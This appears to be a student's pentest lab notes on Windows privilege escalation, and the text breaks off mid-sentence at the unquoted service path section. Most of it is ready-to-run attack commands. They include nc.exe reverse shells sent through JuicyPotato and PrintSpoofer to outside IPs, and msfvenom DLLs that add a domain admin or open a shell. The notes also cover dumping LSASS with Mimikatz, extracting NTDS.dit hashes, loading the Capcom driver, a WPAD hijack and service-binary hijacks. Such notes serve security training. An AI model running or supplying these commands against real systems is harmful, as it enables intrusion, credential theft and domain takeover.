


# Enumerating the enviroment


## Network Information

We should always look at routing tables to view information about the local network , also gather information about the local domain and examine the ARP cache for each interface and view other hosts the host has recently communicated with

```C:\> ipconfig /all```

` C:\> arp -a`

`C:\> route print  `(  Routing Table  )

Many organizations utilize some sort of application whitelisting solution to control what types of applications and files certain users can run. This may be used to attempt to block non-admin users from running cmd.exe or powershell.exe or other binaries and file types not needed for their day-to-day work. A popular solution offered by Microsoft is AppLocker. We can use the `GetAppLockerPolicy` cmdlet to enumerate the local, effective (enforced), and domain AppLocker policies. 


## Check Windows Defender Status

`PS C:\> Get-MpComputerStatus`


## List AppLocker Rules

`PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`


## Test AppLocker Policy

`PS C:\> Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone`

    
## System Information


look at running processes 

```C:\> tasklist /svc```


## Display All Environment Variables


it is not uncommon to find administrators (or applications) modify the PATH. 
If the folder placed in the PATH is writable by your user, it may be possible to perform DLL Injections against other applications. Remember, when running a program, Windows looks for that program in the CWD (Current Working Directory) first, then from the PATH going left to right. This means if the custom path is placed on the left (before C:\Windows\System32), it is much more dangerous than on the right.

In addition to the PATH, set can also give up other helpful information such as the HOME DRIVE. In enterprises, this will often be a file share.   
Shares are utilized for home directories so the user can log on to other computers and have the same experience/files/desktop/etc. (Roaming Profiles). This may also mean the user takes malicious items with them. If a file is placed in USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup, when the user logs into a different machine, this file will execute.

``` C:\ > set``` 

## View Detailed Configuration Information

The systeminfo command will show if the box has been patched recently and if it is a VM.The System Boot Time and OS Version can also be checked to get an idea of the patch level. If the box has not been restarted in over six months, chances are it is also not being patched.

`C:\> systeminfo`



If systeminfo doesn't display hotfixes, they may be queriable with WMI using the WMI-Command binary with QFE (Quick Fix Engineering) to display patches.

```C:\> wmic qfe```

    or

```PS C:\> Get-HotFix | ft -AutoSize```


## Installed Programs

- Is FileZilla/Putty or apps like these installed?
- Run LaZagne to check if stored credentials for those applications are installed. 
- some programs may be installed and running as a service that is vulnerable.

`C:\> wmic product get name`

    or

`PS C:\> Get-WmiObject -Class Win32_Product |  select Name, Version`


## Display Running Processes

The netstat command will display active TCP and UDP connections

`PS C:\> netstat -ano`

    
## User/group information

- Logged-In Users

`C:\> query user`

- Get All Users

`C:\> net user`



- Current User

`C:\> echo %USERNAME%`

- Current User Privileges

`C:\> whoami /priv`

- Current User Group Information

`C:\> whoami /groups`

- Get All Groups

`C:\> net localgroup`

- Details About a Group

`C:\> net localgroup {groupname}`


- Get Password Policy & Other Account Information

`C:\> net accounts`


# Processes



## Access Tokens

In Windows, access tokens are used to describe the security context (security attributes or rules) of a process or thread. The token includes information about the user account's identity and privileges related to a specific process or thread. When a user authenticates to a system, their password is verified against a security database, and if properly authenticated, they will be assigned an access token. Every time a user interacts with a process, a copy of this token will be presented to determine their privilege level.


## Enumerating Network Services

`C:\> netstat -ano`


## Named Pipes


Pipes are essentially files stored in memory that get cleared out after being read.
 
Pipes are used for communication between two applications or processes using shared memory. There are two types of pipes, `named pipes` and `anonymous pipes`. An example of a named pipe is \\.\PipeName\\ExampleNamedPipeServer. Windows systems use a client-server implementation for pipe communication. In this type of implementation, the process that creates a named pipe is the server, and the process communicating with the named pipe is the client. Named pipes can communicate using `half-duplex`, or a `one-way channel `with the client only being able to write data to the server, or `duplex`, which is a two-way communication channel that allows the client to write data over the pipe, and the server to respond back with data over that pipe. Every active connection to a named pipe server results in the creation of a new named pipe. These all share the same pipe name but communicate using a different data buffer.

We can use the tool PipeList from the `Sysinternals` Suite to enumerate instances of named pipes.

    `C:\> pipelist.exe /accepteula`


Additionally, we can use PowerShell to list named pipes using gci (Get-ChildItem).

`PS C:\>  gci \\.\pipe\`

After obtaining a listing of named pipes, we can use `Accesschk` to enumerate the permissions assigned to a specific named pipe by reviewing the Discretionary Access List (DACL)

`C:\> accesschk.exe /accepteula \\.\Pipe\lsass -v`


Using accesschk we can search for all named pipes that allow write access.

`C:\> accesschk.exe -accepteula -w \pipe\WindscribeService -v`







# Windows Privileges

    
User and group privileges are stored in a database and granted via an access token when a user logs on to a system.
Each time a user attempts to perform a privileged action, the system reviews the user's access token to see if the account has the required privileges, and if so, checks to see if they are enabled!

## Windows Authorization Process

Every single security principal is identified by a unique Security Identifier (SID).
This process started when a user attempts to access a securable object such as a folder on a file share. During this process, the user's access token (including their user SID, SIDs for any groups they are members of, privilege list, and other access information) is compared against Access Control Entries (ACEs) within the object's security descriptor (which contains security information about a securable object such as access rights (discussed below) granted to users or groups). Once this comparison is complete, a decision is made to either grant or deny access. 


#Rights and Privileges in Windows

    The following groups can be abused in an active directory enviroment to escalate privileges

   
   
|Group 	|Description|
|----------|--------|
Default Administrators 	 |Domain Admins and Enterprise Admins are "super" groups.
Server Operators 	|Members can modify services, access SMB shares, and backup files.
Backup Operators 	 |Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.
Print Operators 	|Members can log on to DCs locally and "trick" Windows into loading a malicious driver.
Hyper-V Administrators 	|If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.
Account Operators 	|Members can modify non-protected accounts and groups in the domain.
Remote Desktop Users 	|Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.
Remote Management Users 	|Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).
Group Policy Creator Owners 	|Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.
Schema Admins 	|Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.
DNS Admins 	|Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record.





## User Rights Assignment

Depending on group membership, and other factors such as privileges assigned via domain and local Group Policy, users can have various rights assigned to their account.

Typing the command whoami /priv will give you a listing of all user rights assigned to your current user. Some rights are only available to administrative users and can only be listed/leveraged when running an elevated cmd or PowerShell session.

[Enable-Privilege.ps1](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1)  
[another script](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/ ) 

    !!!!A securable object is an object that can have a security descriptor. All named Windows objects are securable. Some unnamed objects, such as process and thread objects, can have security descriptors too. 
```
    Each type of securable object defines its own set of specific access rights and its own mapping of generic access rights. 
```
    
```
    !!Each process on the system holds a token object reference within its
    EPROCESS structure which is used during object access negotiations or
    privileged system tasks.  This token is granted via LSASS during the logon
    process, and thus all processes within a session run under the same token,
    initially.
```

```
    !!!A process holds a primary token and threads executing within the process
    inherit this same token.  When a thread needs to access an object using a
    different set of credentials, it can use an impersonation token.  Using an
    impersonation token does not impact the primary token or other threads, but
    only execution in the context of the impersonating thread.  These
    impersonation tokens can be obtained via a number of different APIs
    provided by the kernel.
```
```
!!The token serves as  processes access ticket, which must be presented to
the various gatekeepers within Windows; it's evaluated via SeAccessCheck on
object access and by SeSinglePrivilegeCheck during privileged operations.
When a process requests write access to a file, for example, SeAccessCheck
will evaluate the tokens integrity level followed by an evaluation of its
Discretionary Access Control List (DACL).  When a process attempts to
shutdown a system via NtShutdownSystem, the kernel will evaluate whether or
not the requesting process token has SeShutdownPrivilege enabled.
```




## SeImpersonate and SeAssignPrimaryToken

    

Acccess tokens are not considered secure resources, as they are just locations within memory that could be brute-forced by users that cannot read memory. To utilize the token, the SeImpersonate privilege is needed. 

Legitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges. Processes generally do this by making a call to the WinLogon process to get a SYSTEM token, then executing itself with that token placing it within the SYSTEM space. Attackers often abuse this privilege in the "Potato style" privescs - where a service account can SeImpersonate, but not obtain full SYSTEM level privileges. Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.



### JuicyPotato

        !JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards.



- Connecting with MSSQLClient.py

`$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth`

- Enabling xp_cmdshell

`SQL> enable_xp_cmdshell`

    Note: We don't actually have to type RECONFIGURE as Impacket does this for us.

- Confirming Access

`SQL> xp_cmdshell whoami /priv`


download the JuicyPotato.exe binary and upload this and nc.exe to the target server. 
- -l is the COM server listening port
-  -p is the program to launch (cmd.exe)
- -a is the argument passed to cmd.exe, and 
- -t is the createprocess call(depends on privilege)

`SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *`



### PrintSpoofer and RoguePotato


#### PrintSpoofer
We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell - which we will do in our example. Again, connect with mssqlclient.py and use the tool with the -c argument to execute a command. Here, using nc.exe to spawn a reverse shell 

`SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.15.91 4040 -e cmd"`


#### metasploit PrintSpoofer

    use exploit/windows/local/ms16_075_reflection_juicy





## SeDebugPrivilege

    

### ProcDump

We can use ProcDump from the SysInternals suite to leverage this privilege and dump process memory. 

`C:\> procdump.exe -accepteula -ma lsass.exe lsass.dmp`

This is successful, and we can load this in Mimikatz using the sekurlsa::minidump commandand execute sekurlsa::logonPasswords commands

    Note: It is always a good idea to type "log" before running any commands in "Mimikatz"
```
    C:\> mimikatz.exe

    mimikatz # log

    mimikatz # sekurlsa::minidump lsass.dmp

    mimikatz # sekurlsa::logonpasswords
```
    !we can take a manual memory dump of the LSASS process via the Task Manager by browsing to the Details tab, choosing the LSASS process, and selecting Create dump file.



### Remote Code Execution as SYSTEM



First, transfer this [PoC script ](   https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1 )  over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"") `
        
        Note that we must add a third blank argument "" at the end for the PoC to work properly.

[another](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) poc script



## SeTakeOwnershipPrivilege

        
SeTakeOwnershipPrivilege grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns WRITE_OWNER rights over an object, meaning the user can change the owner within the object's security descriptor.


#### Setting this right
The setting can be set in Group Policy under:

    Computer Configuration ⇾ Windows Settings ⇾ Security Settings ⇾ Local Policies ⇾ User Rights Assignment

    
    
#### Enabling SeTakeOwnershipPrivilege


We can enable it using this script 
[EnableAllTokenPrivs.ps1](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)  

```
    PS C:\> Import-Module .\Enable-Privilege.ps1
    PS C:\> .\EnableAllTokenPrivs.ps1
```

#### Choosing a Target File


```
    c:\inetpub\wwwwroot\web.config
    %WINDIR%\repair\sam
    %WINDIR%\repair\system
    %WINDIR%\repair\software  , %WINDIR%\repair\security
    %WINDIR%\system32\config\SecEvent.Evt
    %WINDIR%\system32\config\default.sav
    %WINDIR%\system32\config\security.sav
    %WINDIR%\system32\config\software.sav
    %WINDIR%\system32\config\system.sav
```


#### Gather Info
```    PS C:\> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}```

#### Checking File Ownership

If the owner is not shown, means that we likely do not have enough permissions over the object.

`PS C:\> cmd /c dir /q 'C:\Department Shares\Private\IT'`

We can see that the IT share appears to be owned by a service account and does contain a file cred.txt with some data inside it.

#### Taking Ownership 

`PS C:\> takeown /f 'C:\Department Shares\Private\IT\cred.txt'`

#### Confirming Ownership Changed

```PS C:\> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}```

#### Modifying the File ACL

    We may still not be able to read the file and need to modify the file ACL using icacls to be able to read it.

`PS C:\> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F`







# Windows Group Privileges

        

## Windows Builtin Groups

        
    
Some of the builtin groups in active directory enviroment are the above

-    Backup Operators 	
-    Event Log Readers 	
-    DnsAdmins
-    Hyper-V Administrators 	
-    Print Operators 	
-    Server Operators


`PS C:\> whoami /groups`

### Backup Operators 

Membership of this group grants its members the SeBackup and SeRestore privileges. The SeBackupPrivilege allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag.


    [POC](https://github.com/giuliano108/SeBackupPrivilege)

#### Importing the module
```
    PS C:\> Import-Module .\SeBackupPrivilegeUtils.dll
    PS C:\> Import-Module .\SeBackupPrivilegeCmdLets.dll
```
#### Verifying SeBackupPrivilege is Enabled
```
    PS C:\> whoami /priv

    SeBackupPrivilege             Back up files and directories  Disabled
    ...

    PS C:\> Get-SeBackupPrivilege

 ```   
#### Copying a Protected File
```
PS C:\> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' c:\path\to\new\file
```


#### Attacking a Domain Controller - Copying NTDS.dit


- This group also permits logging in locally to a domain controller. 

- The  NTDS.dit contains the NTLM hashes for all user and computer objects in the domain. 
- However, this file is locked 

- we can use the Windows diskshadow utility to create a shadow copy of the C drive and expose it as E drive

[shadowcopies according to microsoft](  https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow  )

```
    PS C:\> diskshadow.exe

    DISKSHADOW> set verbose on
    DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
    DISKSHADOW> set context clientaccessible //Specifies that the shadow copy is usable by client versions of Windows. This context is persistent by default.
    DISKSHADOW> set context persistent    // 	Specifies that the shadow copy persists across program exit, reset, or restart.
    DISKSHADOW> begin backup
    DISKSHADOW> add volume C: alias cdrive
    DISKSHADOW> create
    DISKSHADOW> expose %cdrive% E:
    DISKSHADOW> end backup
    DISKSHADOW> exit
```

#### Copying NTDS.dit Locally
```
    PS C:\> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
    
    
#### Backing up SAM and SYSTEM Registry Hives


```
C:\> reg save HKLM\SYSTEM SYSTEM.SAV

C:\> reg save HKLM\SAM SAM.SAV
```
    !It's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it
#### Extracting Credentials from NTDS.dit

```
PS C:\> Import-Module .\DSInternals.psd1

PS C:\> $key = Get-BootKey -SystemHivePath .\SYSTEM

PS C:\> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```


#### Extracting Hashes Using SecretsDump
```
    $ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```


#### Robocopy

The built-in utility robocopy can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. 

`C:\> robocopy /B E:\Windows\NTDS .\ntds ntds.dit`






### Event Log Readers

    
Administrators or members of the Event Log Readers group have permission to access logs.

#### Confirming Group Membership

`C:\> net localgroup "Event Log Readers"`

#### Searching Security Logs Using wevtutil

We can query Windows events from the command line using 
- the wevtutil utility
- the Get-WinEvent PowerShell cmdlet.

Many Windows commands support `passing a password as a parameter`, and if auditing of process command lines is enabled, this sensitive information will be captured.

```PS C:\> wevtutil qe Security /rd:true /f:text | Select-String "/user"```

    
    
#### Passing Credentials to wevtutil

We can also specify alternate credentials for wevtutil using the parameters /u and /p.

```C:\> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"```

    
#### Searching Security Logs Using Get-WinEvent in PS

    
    
Note: Searching the Security event log with Get-WInEvent requires administrator access or permissions adjusted on the registry key `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. Membership in just the Event Log Readers group is not sufficient.

```
PS C:\> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```



### DnsAdmins

    
The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as NT AUTHORITY\SYSTEM

It is possible to use the built-in dnscmd utility to specify the path of the plugin DLL. [adsecurity](   https://adsecurity.org/?p=4064  )

The following attack can be performed when DNS is run on a Domain Controller :



-    DNS management is performed over RPC
    
-    ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. 
-    This can be done with the dnscmd tool from the command line
    
-    When a member of the DnsAdmins group runs the dnscmd command below, the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll registry key is populated
    
-    When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
    
-    An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.


#### Generating Malicious DLL

`$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`


`$ python3 -m http.server 7777`

`PS C:\>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"`




#### Loading DLL

     Only members of the DnsAdmins group are permitted to do this.

`C:\> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll`




    !!Note: We must specify the full path to our custom DLL or the attack will not work properly.



#### Try to restart the service

`C:\> wmic useraccount where name="netadm" get sid`

     -Checking Permissions on DNS Service

     Once we have the user's SID, we can use the sc command to check permissions on the service. 
```
     C:\> sc.exe sdshow DNS

     D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```
    (  SDDL syntax in Windows)

#### Stopping the DNS Service

`C:\> sc stop dns`

#### Starting the DNS Service

`C:\> sc start dns`

#### Confirming exploitation

`C:\> net group "Domain Admins" /dom`

    


#### Cleaning up

`C:\> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll`

`C:\> sc.exe start dns`

`C:\> sc query dns`




#### Creating a WPAD Record

Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to disable global query block security, which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.

After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.

#### Disabling the Global Query Block List

`C:\> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`

#### Adding a WPAD Record

`C:\> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address {attackers_machine}`





                
### Print Operators


Print Operators is another highly privileged group, which grants its members the SeLoadDriverPrivilege, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. 

members of this group can load and unload device drivers on all domain controllers in the domain

Use Gui to spawn a administrator shell or bypass [UAC](https://github.com/hfiref0x/UACME) 

`C:\> whoami /priv`


the driver Capcom.sys contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.



Download it locally and edit it, pasting over the includes below.

Next, from a Visual Studio 2019 Developer Command Prompt, compile it using cl.exe.


#### Compile with cl.exe

`C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`

#### Add Reference to Driver

Next, download the Capcom.sys driver from [here]( https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys  ), and save it to C:\temp. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.

```
C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```


 ```C:\> EnableSeLoadDriverPrivilege.exe```


#### Use ExploitCapcom Tool to Escalate Privileges

[ExploitCapcom](https://github.com/tandasat/ExploitCapcom)

`PS C:\> .\ExploitCapcom.exe`

#### Alternate Exploitation - No GUI

If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling. Here we can edit line 292 and replace C:\\Windows\\system32\\cmd.exe" with, say, a reverse shell binary 
        
#### Automating the Steps

We can use a tool such as [EoPLoadDriver](  https://github.com/TarlogicSecurity/EoPLoadDriver/ ) to automate the process
        
```
C:\> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```
We would then run ExploitCapcom.exe to pop a SYSTEM shell or run our custom binary.

#### Clean-up
```
        C:\> reg delete HKCU\System\CurrentControlSet\Capcom
```
 

        


### Server Operators

        
The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges and the ability to `control local services`.

#### Querying the AppReadiness Service

        C:\> sc qc AppReadiness

#### Checking Service Permissions with PsService

We can use the service viewer/controller PsService, which is part of the Sysinternals suite

`C:\> c:\Tools\PsService.exe security AppReadiness`
        


#### Modifying the Service Binary Path

`C:\> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"`

#### Starting the Service

`C:\> sc start AppReadiness`

#### Retrieving NTLM Password Hashes from the Domain Controller

`$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator`





# OS specific attacks

        


## User Account Control (UAC)


User Account Control (UAC) is a feature that enables a consent prompt for elevated activities. Applications have different integrity levels, and a program with a high level can perform tasks that could potentially compromise the system. When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run.

The default administrator account with RID 500 is always running with elevated privileges.


## Related Registry Keys

|Group Policy Setting 	|Registry Key 	|Default Setting|
|------------------------|---------------|--------------|           
|User Account Control: Admin Approval Mode for the built-in Administrator account |	FilterAdministratorToken 	|Disabled|
|User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop 	|EnableUIADesktopToggle 	|Disabled|
|User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode 	|ConsentPromptBehaviorAdmin 	|Prompt for consent for non-Windows binaries|
|User Account Control: Behavior of the elevation prompt for standard users |	ConsentPromptBehaviorUser |	Prompt for credentials on the secure desktop|
|User Account Control: Detect application installations and prompt for elevation |	EnableInstallerDetection 	|Enabled (default for home) Disabled (default for enterprise)|
|User Account Control: Only elevate executables that are signed and validated 	|ValidateAdminCodeSignatures 	|Disabled|
|User Account Control: Only elevate UIAccess applications that are installed in secure locations 	|EnableSecureUIAPaths |	Enabled|
|User Account Control: Run all administrators in Admin Approval Mode |	EnableLUA 	|Enabled|
|User Account Control: Switch to the secure desktop when prompting for elevation |	PromptOnSecureDesktop |	Enabled|
|User Account Control: Virtualize file and registry write failures to per-user locations |EnableVirtualization 	                   |     Enabled        |



## Bypass Example

There is no command-line version of the GUI consent prompt, so we will have to bypass UAC

 ```       
 C:\> whoami /user

        User Name         SID
        ================= ==============================================
        winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002


C:\> net localgroup administrators

        Members

        -------------------------------------------------------------------------------
        Administrator
        mrb3n
        sarah
        The command completed successfully.



C:\> whoami /priv

        PRIVILEGES INFORMATION
        ----------------------

        Privilege Name                Description                          State
        ============================= ==================================== ========
        SeShutdownPrivilege           Shut down the system                 Disabled
        SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
        SeUndockPrivilege             Remove computer from docking station Disabled
        SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
        SeTimeZonePrivilege           Change the time zone                 Disabled

```

#### Confirming UAC is Enabled


```
C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

        HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
        EnableLUA    REG_DWORD    0x1
```

#### Checking UAC Level
```
C:\> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

        HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
        ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
The value of ConsentPromptBehaviorAdmin is 0x5, which means the highest UAC level of Always notify is enabled.

#### Checking Windows Version

[Refer to this page](  https://en.wikipedia.org/wiki/Windows_10_version_history  )

```
PS C:\> [environment]::OSVersion.Version

        Major  Minor  Build  Revision
        -----  -----  -----  --------
        10     0      14393  0
```


#### The vulnerable system bin               
Using the [UACME](   https://github.com/hfiref0x/UACME   ) and [this](   https://egre55.github.io/system-properties-uac-bypass  ), the 32-bit version of SystemPropertiesAdvanced.exe attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.

#### Dll Search order
!When attempting to locate a DLL, Windows will use the following search order.

- The directory from which the application loaded.
- The system directory C:\Windows\System32 for 64-bit systems.
- The 16-bit system directory C:\Windows\System (not supported on 64-bit systems)
- The Windows directory.
- Any directories that are listed in the PATH environment variable.


#### Reviewing Path Variable

```PS C:\> cmd /c echo %PATH%```

#### Generating  srrstr.dll

```$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll```


#### Executing SystemPropertiesAdvanced.exe on Target Host

```C:\>C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe```






# Weak Permissions


## Permissive File System ACLs

We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs

```PS C:\> .\SharpUp.exe audit```

### Checking Permissions with icacls

We can check the ACL`s uf a file by using [icacls](https://ss64.com/nt/icacls.html) 


The user / group permissions we are looking for are the following:

- The user we are currently logged in as (%USERNAME%)
- Authenticated Users
- Everyone
- BUILTIN\Users
- NT AUTHORITY\INTERACTIVE

`PS C:\> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"`

### Replacing Service Binary

we can make a backup of the original binary and replace it with a malicious binary 
```
C:\> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\> sc start SecurityService
```
## Weak Service Permissions

Let's check the SharpUp output again for any modifiable services. 
```
=== Modifiable Services ===
 
        Name             : WindscribeService
        DisplayName      : WindscribeService
        Description      : Manages the firewall and controls the VPN tunnel
        State            : Running
        StartMode        : Auto
        PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

### Checking Permissions with AccessChk

Next, we'll use AccessChk from the Sysinternals suite to enumerate permissions on the service. 
-  -q (omit banner)
- -u (suppress errors)
- -v (verbose)
- -c (specify name of a Windows service)
- -w (show only objects that have write access)

Here we can see that all Authenticated Users have SERVICE_ALL_ACCESS rights over the service(full read/write control )

```
C:\> accesschk.exe /accepteula -quvcw WindscribeService
 
        Accesschk v6.13 - Reports effective permissions for securable objects
        Copyright ⌐ 2006-2020 Mark Russinovich
        Sysinternals - www.sysinternals.com
        
        WindscribeService
        Medium Mandatory Level (Default) [No-Write-Up]
        RW NT AUTHORITY\SYSTEM
                SERVICE_ALL_ACCESS
        RW BUILTIN\Administrators
                SERVICE_ALL_ACCESS
        RW NT AUTHORITY\Authenticated Users
                SERVICE_ALL_ACCESS
```
Some accesschk results might be:
|Permission |	Use Case|
|-------|-----------|
SERVICE_ALL_ACCESS 	|Can do anything.|
|SERVICE_CHANGE_CONFIG 	|Can reconfigure the service binary.|
|WRITE DAC 	|Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG.|
|WRITE_OWNER |	Can become owner, reconfigure permissions.|
|GENERIC_WRITE |	Inherits SERVICE_CHANGE_CONFIG|
|GENERIC_ALL 	|Inherits SERVICE_CHANGE_CONFIG|


### Query the Service

`C:\>sc qc WindscribeService`
### Changing the Service Binary Path

`C:\> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"`

### Stopping Service

`C:\> sc stop WindscribeService`

### Starting the Service

`C:\> sc start WindscribeService`

# Unquoted Service Path

When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders.


- Service Binary Path

`C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`

Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:

-    C:\Program
